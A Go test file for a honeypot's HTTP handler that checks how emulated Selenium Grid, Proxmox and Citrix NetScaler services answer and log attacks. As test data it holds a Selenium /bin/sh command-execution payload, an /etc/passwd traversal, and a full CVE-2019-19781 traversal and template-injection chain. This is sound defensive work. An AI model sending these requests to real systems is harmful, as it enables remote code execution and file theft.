package tcp

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/mushorg/glutton/connection"
	"github.com/mushorg/glutton/protocols/tcp/citrix"
	"github.com/mushorg/glutton/protocols/tcp/pve"
	"github.com/stretchr/testify/require"
)

func TestFormatRequest(t *testing.T) {
	mockReq, err := http.NewRequest("GET", "http://example.com", nil)
	require.NoError(t, err)
	require.Equal(t, "GET http://example.com HTTP/1.1\nHost: example.com", formatRequest(mockReq))
}

func withHTTPSessionIdle(t *testing.T, idle time.Duration) {
	t.Helper()
	prev := sessionIdle
	sessionIdle = idle
	t.Cleanup(func() {
		sessionIdle = prev
		httpSessions.reset()
		mcpSessions.reset()
	})
}

func httpTestRequest(method, path, sessionID string, body []byte) []byte {
	var b strings.Builder
	fmt.Fprintf(&b, "%s %s HTTP/1.1\r\n", method, path)
	b.WriteString("Host: 127.0.0.1\r\n")
	b.WriteString("User-Agent: test-agent/1.0\r\n")
	b.WriteString("Connection: keep-alive\r\n")
	if sessionID != "" {
		fmt.Fprintf(&b, "Cookie: %s=%s\r\n", httpSessionCookie, sessionID)
	}
	if body != nil {
		fmt.Fprintf(&b, "Content-Length: %d\r\n", len(body))
	}
	b.WriteString("\r\n")
	out := []byte(b.String())
	if body != nil {
		out = append(out, body...)
	}
	return out
}

func TestHandleHTTPKeepAliveOneEvent(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{}, &recordingLogger{}, hp)
	}()

	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	_, err := client.Write(httpTestRequest("GET", "/", "", nil))
	require.NoError(t, err)
	status, headers, _ := readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	sessionID := sessionCookieFromHeaders(t, headers)
	require.NotEmpty(t, sessionID)

	_, err = client.Write(httpTestRequest("GET", "/wallet", sessionID, nil))
	require.NoError(t, err)
	status, _, body := readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.Contains(t, string(body), `[[""]]`)

	require.NoError(t, client.Close())
	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "http", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single produced event, got another: %+v", extra)
	default:
	}

	events, ok := produced.decoded.([]parsedHTTP)
	require.True(t, ok)
	require.GreaterOrEqual(t, len(events), 4)
	require.Equal(t, "read", events[0].Direction)
	require.Equal(t, "GET", events[0].Command)
	require.Equal(t, "/", events[0].Path)
	require.Nil(t, events[0].Parameters)
	require.Equal(t, "127.0.0.1", events[0].Host)
	require.Equal(t, "test-agent/1.0", events[0].UserAgent)
	require.Equal(t, sessionID, events[0].SessionID)
	require.Equal(t, "write", events[1].Direction)
	require.Equal(t, "200", events[1].Status)
	require.Equal(t, sessionID, events[1].SessionID)
	require.Equal(t, "/wallet", events[2].Path)
}

func TestHandleHTTPSeleniumGrid(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{TargetPort: 4444}, &recordingLogger{}, hp)
	}()

	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	_, err := client.Write(httpTestRequest("GET", "/wd/hub/status", "", nil))
	require.NoError(t, err)
	status, headers, body := readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.Contains(t, string(body), "Selenium Grid ready.")
	sessionID := sessionCookieFromHeaders(t, headers)

	greed := []byte(`{"capabilities":{"alwaysMatch":{"browserName":"chrome","goog:chromeOptions":` +
		`{"binary":"/bin/sh","args":["-c","id"]}}}}`)
	_, err = client.Write(httpTestRequest("POST", "/session", sessionID, greed))
	require.NoError(t, err)
	status, _, body = readHTTPResponse(t, client)
	require.Equal(t, http.StatusInternalServerError, status)
	require.Contains(t, string(body), "session not created")

	require.NoError(t, client.Close())
	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "http", produced.protocol)
	events, ok := produced.decoded.([]parsedHTTP)
	require.True(t, ok)
	require.Len(t, events, 4)
	require.Empty(t, events[0].Binary)
	require.Equal(t, "200", events[1].Status)
	require.Equal(t, "POST", events[2].Command)
	require.Equal(t, "chrome", events[2].Browser)
	require.Equal(t, "/bin/sh", events[2].Binary)
	require.Equal(t, []string{"-c", "id"}, events[2].Args)
	require.Equal(t, "500", events[3].Status)
}

func TestHandleHTTPProxmox(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)
	prevNow := httpNow
	httpNow = func() time.Time { return time.Date(2026, 10, 10, 18, 56, 48, 0, time.UTC) }
	t.Cleanup(func() { httpNow = prevNow })

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{TargetPort: pve.Port}, &recordingLogger{}, hp)
	}()

	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	_, err := client.Write(httpTestRequest("GET", "/", "", nil))
	require.NoError(t, err)
	status, headers, body := readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.Equal(t, "pve-api-daemon/3.0", headers.Get("Server"))
	require.Equal(t, "Sat, 10 Oct 2026 18:56:48 GMT", headers.Get("Date"))
	require.Contains(t, string(body), pve.Node().Node+" - Proxmox Virtual Environment")
	sessionID := sessionCookieFromHeaders(t, headers)

	login := []byte("username=root&password=hunter2&realm=pam&new-format=1")
	_, err = client.Write(httpTestRequest("POST", "/api2/json/access/ticket", sessionID, login))
	require.NoError(t, err)
	status, _, body = readHTTPResponse(t, client)
	require.Equal(t, http.StatusUnauthorized, status)
	require.Equal(t, `{"data":null}`, string(body))

	_, err = client.Write(httpTestRequest("GET", "/api2/json/version", sessionID, nil))
	require.NoError(t, err)
	status, _, _ = readHTTPResponse(t, client)
	require.Equal(t, http.StatusUnauthorized, status)

	require.NoError(t, client.Close())
	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "http", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single produced event, got another: %+v", extra)
	default:
	}
	events, ok := produced.decoded.([]parsedHTTP)
	require.True(t, ok)
	require.Len(t, events, 6)
	require.Equal(t, "GET", events[0].Command)
	require.Empty(t, events[0].Username)
	require.Equal(t, "write", events[1].Direction)
	require.Equal(t, "200", events[1].Status)
	require.Equal(t, "POST", events[2].Command)
	require.Equal(t, "/api2/json/access/ticket", events[2].Path)
	require.Equal(t, "root@pam", events[2].Username)
	require.Equal(t, "401", events[3].Status)
	require.Equal(t, "/api2/json/version", events[4].Path)
	require.Equal(t, "401", events[5].Status)

	// the password stays only in the raw request payload
	for _, ev := range events {
		require.NotContains(t, ev.Username, "hunter2")
		require.NotContains(t, ev.Query, "hunter2")
	}
}

func TestHandleHTTPParameters(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{}, &recordingLogger{}, hp)
	}()

	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	_, err := client.Write(httpTestRequest("GET", "/search?q=lfi&file=../../etc/passwd", "", nil))
	require.NoError(t, err)
	_, _, _ = readHTTPResponse(t, client)

	require.NoError(t, client.Close())
	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	events, ok := produced.decoded.([]parsedHTTP)
	require.True(t, ok)
	require.GreaterOrEqual(t, len(events), 1)
	require.Equal(t, url.Values{
		"q":    {"lfi"},
		"file": {"../../etc/passwd"},
	}.Encode(), events[0].Query)
	require.Equal(t, url.Values{
		"q":    {"lfi"},
		"file": {"../../etc/passwd"},
	}, events[0].Parameters)
}

func TestHandleHTTPSessionGroupsAcrossConnections(t *testing.T) {
	withHTTPSessionIdle(t, 80*time.Millisecond)

	hp := newFakeHoneypot()

	client1, server1 := net.Pipe()
	done1 := make(chan error, 1)
	go func() {
		done1 <- HandleHTTP(context.Background(), server1, connection.Metadata{}, &recordingLogger{}, hp)
	}()

	_, err := client1.Write(httpTestRequest("GET", "/", "", nil))
	require.NoError(t, err)
	status, headers, _ := readHTTPResponse(t, client1)
	require.Equal(t, http.StatusOK, status)
	sessionID := sessionCookieFromHeaders(t, headers)
	require.NotEmpty(t, sessionID)
	require.NoError(t, client1.Close())
	require.NoError(t, <-done1)

	select {
	case extra := <-hp.produced:
		t.Fatalf("expected no event before session idle, got: %+v", extra)
	case <-time.After(20 * time.Millisecond):
	}

	client2, server2 := net.Pipe()
	done2 := make(chan error, 1)
	go func() {
		done2 <- HandleHTTP(context.Background(), server2, connection.Metadata{}, &recordingLogger{}, hp)
	}()

	_, err = client2.Write(httpTestRequest("GET", "/api", sessionID, nil))
	require.NoError(t, err)
	status, _, _ = readHTTPResponse(t, client2)
	require.Equal(t, http.StatusOK, status)
	require.NoError(t, client2.Close())
	require.NoError(t, <-done2)

	produced := waitProduced(t, hp)
	require.Equal(t, "http", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single session event, got another: %+v", extra)
	case <-time.After(150 * time.Millisecond):
	}

	events := produced.decoded.([]parsedHTTP)
	require.GreaterOrEqual(t, len(events), 4)
	require.Equal(t, "/", events[0].Path)
	require.Equal(t, sessionID, events[0].SessionID)
	require.Equal(t, "/api", events[2].Path)
	require.Equal(t, sessionID, events[2].SessionID)
}

func TestHandleHTTPGroupsCookielessBySourceIP(t *testing.T) {
	withHTTPSessionIdle(t, 80*time.Millisecond)

	hp := newFakeHoneypot()

	request := func(srcPort int, dstPort uint16, path string) {
		client, server := net.Pipe()
		conn := &remoteAddrConn{Conn: server, remote: &net.TCPAddr{IP: net.ParseIP("94.26.0.103"), Port: srcPort}}
		done := make(chan error, 1)
		go func() {
			done <- HandleHTTP(context.Background(), conn, connection.Metadata{TargetPort: dstPort}, &recordingLogger{}, hp)
		}()
		_, err := client.Write(httpTestRequest("GET", path, "", nil))
		require.NoError(t, err)
		status, _, _ := readHTTPResponse(t, client)
		require.Equal(t, http.StatusOK, status)
		require.NoError(t, client.Close())
		require.NoError(t, <-done)
	}

	request(44620, 3000, "/a")
	request(58700, 8080, "/b")
	request(44624, 3000, "/c")

	produced := waitProduced(t, hp)
	require.Equal(t, "http", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single session event, got another: %+v", extra)
	case <-time.After(150 * time.Millisecond):
	}

	events := produced.decoded.([]parsedHTTP)
	require.Len(t, events, 6)
	var reads []parsedHTTP
	for _, e := range events {
		require.Equal(t, events[0].SessionID, e.SessionID)
		if e.Direction == "read" {
			reads = append(reads, e)
		}
	}
	require.Len(t, reads, 3)
	require.Equal(t, "/a", reads[0].Path)
	require.Equal(t, uint16(3000), reads[0].DestPort)
	require.Equal(t, "44620", reads[0].SrcPort)
	require.Equal(t, "/b", reads[1].Path)
	require.Equal(t, uint16(8080), reads[1].DestPort)
	require.Equal(t, "58700", reads[1].SrcPort)
	require.Equal(t, "/c", reads[2].Path)
}

func TestHandleHTTPSourceSessionRollsOverWhenFull(t *testing.T) {
	withHTTPSessionIdle(t, time.Minute)

	tracker := func() *sessionTracker[parsedHTTP] {
		return &sessionTracker[parsedHTTP]{
			srcHost: "94.26.0.103",
			table:   httpSessions,
			spec:    sessionSpec[parsedHTTP]{protocol: "http", payload: httpPayload, stamp: stampHTTP, groupBySource: true},
		}
	}
	first := tracker()
	first.ensure()
	second := tracker()
	second.ensure()
	require.Same(t, first.session, second.session)

	for i := 0; i < maxSourceSessionFrames; i++ {
		first.record(parsedHTTP{Direction: "read"})
	}
	third := tracker()
	third.ensure()
	require.NotSame(t, first.session, third.session)

	for _, tr := range []*sessionTracker[parsedHTTP]{first, second, third} {
		tr.session.endNow()
	}
}

func TestHandleHTTPEarlyDisconnect(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)

	client, serverConn := net.Pipe()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{}, &recordingLogger{}, hp)
	}()

	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	select {
	case extra := <-hp.produced:
		t.Fatalf("connect-only probe should not produce an event, got: %+v", extra)
	case <-time.After(100 * time.Millisecond):
	}
}

func TestHandleHTTPHandsOffMCP(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{}, &recordingLogger{}, hp)
	}()

	_, err := client.Write(mcpInitializeRequest(1))
	require.NoError(t, err)
	status, headers, _ := readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.NotEmpty(t, headers.Get("Mcp-Session-Id"))
	require.NoError(t, client.Close())

	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "mcp", produced.protocol)
	_, ok := produced.decoded.([]parsedMCP)
	require.True(t, ok)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected no HTTP event after MCP handoff, got: %+v", extra)
	case <-time.After(100 * time.Millisecond):
	}
}

func sessionCookieFromHeaders(t *testing.T, headers http.Header) string {
	t.Helper()
	for _, c := range headers.Values("Set-Cookie") {
		if strings.HasPrefix(c, httpSessionCookie+"=") {
			val := strings.TrimPrefix(c, httpSessionCookie+"=")
			if i := strings.IndexByte(val, ';'); i >= 0 {
				val = val[:i]
			}
			return val
		}
	}
	return ""
}

// Synthetic CVE-2019-19781 chain modeled on public scanners (cisagov,
// trustedsec) and exploits: fingerprint, probe, smb.conf, template write, fetch.
func TestHandleHTTPCitrix(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{TargetPort: 443}, &recordingLogger{}, hp)
	}()

	require.NoError(t, client.SetDeadline(time.Now().Add(2*time.Second)))
	_, err := client.Write(httpTestRequest("GET", "/vpn/index.html", "", nil))
	require.NoError(t, err)
	status, headers, body := readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.Equal(t, "Apache", headers.Get("Server"))
	require.Contains(t, string(body), "<title>NetScaler Gateway</title>")
	sessionID := sessionCookieFromHeaders(t, headers)

	_, err = client.Write(httpTestRequest("GET", "/vpn/../vpns/", sessionID, nil))
	require.NoError(t, err)
	status, _, _ = readHTTPResponse(t, client)
	require.Equal(t, http.StatusForbidden, status)

	_, err = client.Write(httpTestRequest("GET", "/vpn/%2e%2e/vpns/cfg/smb.conf", sessionID, nil))
	require.NoError(t, err)
	status, _, body = readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.Contains(t, string(body), "[global]")

	form := []byte("url=http://example.com&title=%5B%25+template.new%28%7B%27BLOCK%27%3D%27print+readpipe%28%22id%22%29%27%7D%29%25%5D&desc=desc&UI_inuse=a")
	write := httpTestRequest("POST", "/vpn/../vpns/portal/scripts/newbm.pl", sessionID, form)
	write = bytes.Replace(write, []byte("\r\n\r\n"), []byte("\r\nNSC_USER: ../../../netscaler/portal/templates/aXJlZ2F\r\nNSC_NONCE: nsroot\r\n\r\n"), 1)
	_, err = client.Write(write)
	require.NoError(t, err)
	status, _, body = readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.Contains(t, string(body), "parent.window.ns_reload")

	_, err = client.Write(httpTestRequest("GET", "/vpn/../vpns/portal/aXJlZ2F.xml", sessionID, nil))
	require.NoError(t, err)
	status, _, body = readHTTPResponse(t, client)
	require.Equal(t, http.StatusOK, status)
	require.Empty(t, body)

	require.NoError(t, client.Close())
	select {
	case err := <-done:
		require.NoError(t, err)
	case <-time.After(2 * time.Second):
		t.Fatal("handler did not finish")
	}

	produced := waitProduced(t, hp)
	require.Equal(t, "http", produced.protocol)
	select {
	case extra := <-hp.produced:
		t.Fatalf("expected a single produced event, got another: %+v", extra)
	default:
	}
	events, ok := produced.decoded.([]parsedHTTP)
	require.True(t, ok)
	require.Len(t, events, 10)

	wantReads := []struct {
		command, path string
		citrix        *citrix.Request
	}{
		{"GET", "/vpn/index.html", &citrix.Request{Stage: citrix.StageLogin}},
		{"GET", "/vpn/../vpns/", &citrix.Request{Stage: citrix.StageProbe}},
		{"GET", "/vpn/%2e%2e/vpns/cfg/smb.conf", &citrix.Request{Stage: citrix.StageSMBConf}},
		{"POST", "/vpn/../vpns/portal/scripts/newbm.pl", &citrix.Request{
			Stage:    citrix.StageTemplateWrite,
			NSCUser:  "../../../netscaler/portal/templates/aXJlZ2F",
			Template: `[% template.new({'BLOCK'='print readpipe("id")'})%]`,
		}},
		{"GET", "/vpn/../vpns/portal/aXJlZ2F.xml", &citrix.Request{Stage: citrix.StageTemplateFetch}},
	}
	wantStatus := []string{"200", "403", "200", "200", "200"}
	for i, want := range wantReads {
		read, wrote := events[2*i], events[2*i+1]
		require.Equal(t, "read", read.Direction)
		require.Equal(t, want.command, read.Command)
		require.Equal(t, want.path, read.Path)
		require.Equal(t, want.citrix, read.Citrix)
		require.Equal(t, "write", wrote.Direction)
		require.Equal(t, wantStatus[i], wrote.Status)
		require.Nil(t, wrote.Citrix)
	}
	require.Equal(t, write, events[6].Payload)
}

func TestHandleHTTPNonCitrixPathUntagged(t *testing.T) {
	withHTTPSessionIdle(t, 50*time.Millisecond)

	client, serverConn := net.Pipe()
	defer client.Close()

	hp := newFakeHoneypot()
	done := make(chan error, 1)
	go func() {
		done <- HandleHTTP(context.Background(), serverConn, connection.Metadata{}, &recordingLogger{}, hp)
	}()

	// No traversal: a real appliance would not leak smb.conf here.
	_, err := client.Write(httpTestRequest("GET", "/vpns/cfg/smb.conf", "", nil))
	require.NoError(t, err)
	_, _, body := readHTTPResponse(t, client)
	require.Empty(t, body)
	require.NoError(t, client.Close())
	<-done

	events := waitProduced(t, hp).decoded.([]parsedHTTP)
	require.Len(t, events, 2)
	require.Nil(t, events[0].Citrix)
}
